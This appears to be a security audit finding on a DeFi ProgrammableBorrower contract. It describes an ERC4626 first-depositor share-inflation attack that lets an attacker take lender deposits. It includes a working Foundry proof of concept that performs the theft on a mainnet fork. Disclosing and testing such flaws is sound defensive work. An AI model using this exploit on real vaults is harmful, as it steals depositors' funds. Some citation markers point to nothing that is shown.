### Title
ERC4626 share inflation lets the first vault depositor steal programmable-borrower deposits - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` accepts an operator-configured ERC4626 vault, grants it unlimited underlying allowance, and deposits all idle lender funds without enforcing a minimum share output or protecting against first-depositor share inflation. [1](#0-0) [2](#0-1) 

### Finding Description
The factory passes a caller-supplied `programmableBorrowerParams.vault` into `ProgrammableBorrower.initialize`, and initialization validates only that the vault’s `asset()` matches the CDO underlying. [3](#0-2) [4](#0-3) 

When the CDO starts an epoch, it transfers surplus underlying to the programmable borrower and invokes `onStartEpoch`, which then deposits the borrower’s complete token balance into the configured vault. [5](#0-4) [6](#0-5) 

An unprivileged vault depositor can front-run that deposit in an empty or nearly empty proportional-share ERC4626 vault by depositing one wei and donating `D` underlying directly to the vault. [7](#0-6) 

If the next programmable-borrower deposit is less than the inflated assets per share, `vault.deposit` mints zero shares while retaining the full deposit because `_depositToVault` accepts any returned share amount. [8](#0-7) 

The attacker then redeems the only outstanding vault share and receives both the donation and the lender deposit, while `ProgrammableBorrower` has already recorded the deposit in `epochStartVaultAssets` as if it were still principal. [6](#0-5) 

### Impact Explanation
This violates deposit solvency and fair asset-to-share conversion: lender underlying is transferred into the vault, but the programmable borrower receives no corresponding withdrawal claim. [2](#0-1) 

For an attacker cost of `D + 1`, the attacker receives `D + 1 + V`, where `V` is the programmable-borrower deposit, so attacker profit is approximately `V` and lender loss can equal the entire epoch-start deposit when `V <= D`. [9](#0-8) 

The loss is initially hidden because `epochStartVaultAssets` snapshots the pre-deposit cash amount rather than the post-deposit redeemable vault value. [6](#0-5) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to be empty or nearly empty and to calculate shares from raw managed assets without virtual-share or dead-share inflation protection. [4](#0-3) 

It is reachable when a new revolving facility is configured against a fresh vault or when the honest owner or manager calls `setVault` while the old position is empty, because the attacker only needs ordinary deposit and token-transfer access before the next `startEpoch`. [10](#0-9) [11](#0-10) 

An already-populated vault implementing ERC4626 virtual assets and shares substantially reduces or eliminates this specific path, so this is a configuration-dependent integration vulnerability rather than a universal loss in every programmable-borrower deployment. [12](#0-11) 

### Recommendation
Only integrate ERC4626 vaults that implement inflation-resistant share accounting, such as virtual assets and shares or permanently locked dead shares, and verify that property before initialization or `setVault`. [13](#0-12) 

`_depositToVault` should also enforce a configured `minSharesOut` or post-deposit redeemable-value floor and revert when the returned shares are economically insufficient. [2](#0-1) 

For additional protection, require the selected vault to be pre-seeded before it is assigned, reject zero-share deposits, and emit/verify the assets-to-shares conversion in deployment and vault-switch procedures. [10](#0-9) 

### Proof of Concept
The following Foundry test reproduces the vault-inflation loss on a mainnet fork using real USDC as the underlying and a minimal ordinary proportional-share ERC4626 vault. [14](#0-13) 

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProgrammableBorrower} from
  "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableERC4626 is ERC20 {
  IERC20 public immutable assetToken;

  constructor(address asset_) ERC20("Vault Share", "vSHARE") {
    assetToken = IERC20(asset_);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 supply = totalSupply();
    uint256 managed = totalAssets();
    shares = supply == 0 ? assets : assets * supply / managed;

    require(assetToken.transferFrom(msg.sender, address(this), assets));
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    require(assetToken.transfer(receiver, assets));
  }
}

contract DummyCDO {
  address public token;

  constructor(address token_) {
    token = token_;
  }
}

contract ProgrammableBorrowerVaultInflationTest is Test {
  address internal constant USDC =
    0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

  function testFirstDepositorStealsEpochStartDeposit() external {
    vm.createSelectFork("mainnet", 19_225_935);

    address attacker = makeAddr("attacker");
    address borrower = makeAddr("borrower");
    address manager = makeAddr("manager");

    InflatableERC4626 vault = new InflatableERC4626(USDC);
    DummyCDO cdo = new DummyCDO(USDC);

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    ProgrammableBorrower programmable = ProgrammableBorrower(
      address(
        new TransparentUpgradeableProxy(
          address(implementation),
          makeAddr("proxyAdmin"),
          abi.encodeWithSelector(
            ProgrammableBorrower.initialize.selector,
            address(vault),
            address(cdo),
            address(this),
            manager,
            borrower,
            0
          )
        )
      )
    );

    uint256 victimDeposit = 1_000_000e6;
    uint256 donation = victimDeposit;

    deal(USDC, attacker, donation + 1);

    vm.startPrank(attacker);
    IERC20(USDC).approve(address(vault), type(uint256).max);
    vault.deposit(1, attacker);
    IERC20(USDC).transfer(address(vault), donation);
    vm.stopPrank();

    deal(USDC, address(programmable), victimDeposit);
    vm.prank(address(cdo));
    programmable.onStartEpoch(0);

    assertEq(vault.balanceOf(address(programmable)), 0);

    vm.prank(attacker);
    uint256 stolen = vault.redeem(1, attacker, attacker);

    assertEq(stolen, donation + 1 + victimDeposit);
    assertEq(
      IERC20(USDC).balanceOf(attacker),
      donation + 1 + victimDeposit
    );
  }
}
```

The production sequence reaches the same deposit primitive after `IdleCDOEpochVariant` transfers the epoch’s surplus underlying to the programmable borrower and calls `onStartEpoch`. [11](#0-10) 

The expected result is that the programmable borrower’s deposit mints zero shares, while the attacker’s one share redeems `donation + 1 + victimDeposit`, producing a quantified profit equal to the full `victimDeposit`. [8](#0-7)

  /// @notice Hook called by IdleCDOEpochVariant when a new epoch starts.
  /// It deposits all on-hand assets into the vault and starts accounting.
  /// @param _pendingWithdraws pending withdraw requests amount to reserve for epoch end.
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
